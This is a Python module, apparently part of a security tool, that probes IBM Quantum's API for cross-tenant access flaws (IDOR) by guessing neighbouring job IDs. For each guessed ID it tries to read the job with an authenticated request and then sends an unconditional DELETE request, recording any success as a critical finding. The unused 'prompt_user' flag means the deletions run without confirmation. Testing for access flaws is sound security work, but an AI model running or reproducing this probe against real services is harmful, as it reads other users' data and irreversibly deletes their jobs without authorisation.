import re
import httpx
from datetime import datetime
from typing import Dict, List, Any
from pydantic import BaseModel, Field

from qrecon.q_attck.models import Finding, Severity

class CrossTenantProbingResult(BaseModel):
    platform: str
    timestamp: datetime = Field(default_factory=datetime.utcnow)
    probed_job_ids: List[str] = []
    job_responses: Dict[str, Dict[str, str]] = {}
    findings: List[Finding] = []


class CrossTenantProber:
    def __init__(self, ibm_token: str):
        self.ibm_token = ibm_token

    def probe(self, base_job_id: str = "job_12345", prompt_user: bool = True) -> CrossTenantProbingResult:
        result = CrossTenantProbingResult(platform="ibm-quantum")
        
        candidate_ids = self._generate_candidates(base_job_id)
        result.probed_job_ids = candidate_ids
        
        base_url = "https://api.quantum-computing.ibm.com"
        headers = {"X-Access-Token": self.ibm_token}

        with httpx.Client(timeout=10.0) as client:
            for job_id in candidate_ids:
                responses = {}
                try:
                    resp_get = client.get(f"{base_url}/v4/jobs/{job_id}", headers=headers)
                    responses["GET"] = str(resp_get.status_code)
                    
                    if resp_get.status_code == 200:
                        finding = Finding(
                            module="auth_probe.cross_tenant",
                            title="Cross-tenant job read access (IDOR)",
                            description=f"Successfully read details for foreign job ID: {job_id}",
                            severity=Severity.CRITICAL,
                            platform="ibm-quantum",
                            raw_data={"job_id": job_id, "operation": "GET"}
                        )
                        result.findings.append(finding)
                        
                    resp_delete = client.delete(f"{base_url}/v4/jobs/{job_id}", headers=headers)
                    responses["DELETE"] = str(resp_delete.status_code)
                    
                    if resp_delete.status_code in [200, 204]:
                        finding = Finding(
                            module="auth_probe.cross_tenant",
                            title="Cross-tenant job deletion (IDOR)",
                            description=f"Successfully deleted foreign job ID: {job_id}",
                            severity=Severity.CRITICAL,
                            platform="ibm-quantum",
                            raw_data={"job_id": job_id, "operation": "DELETE"}
                        )
                        result.findings.append(finding)

                except Exception as e:
                    responses["GET"] = "Error"
                    responses["DELETE"] = "Error"
                    
                result.job_responses[job_id] = responses

        return result
        
    def _generate_candidates(self, base_id: str) -> List[str]:
        candidates = []
        match = re.search(r'(\d+)$', base_id)
        if match:
            num = int(match.group(1))
            prefix = base_id[:match.start(1)]
            for i in range(1, 6):
                candidates.append(f"{prefix}{num + i}")
                candidates.append(f"{prefix}{num - i}")
        else:
            candidates = [f"mock_foreign_job_{i}" for i in range(10)]
            
        return candidates[:10]
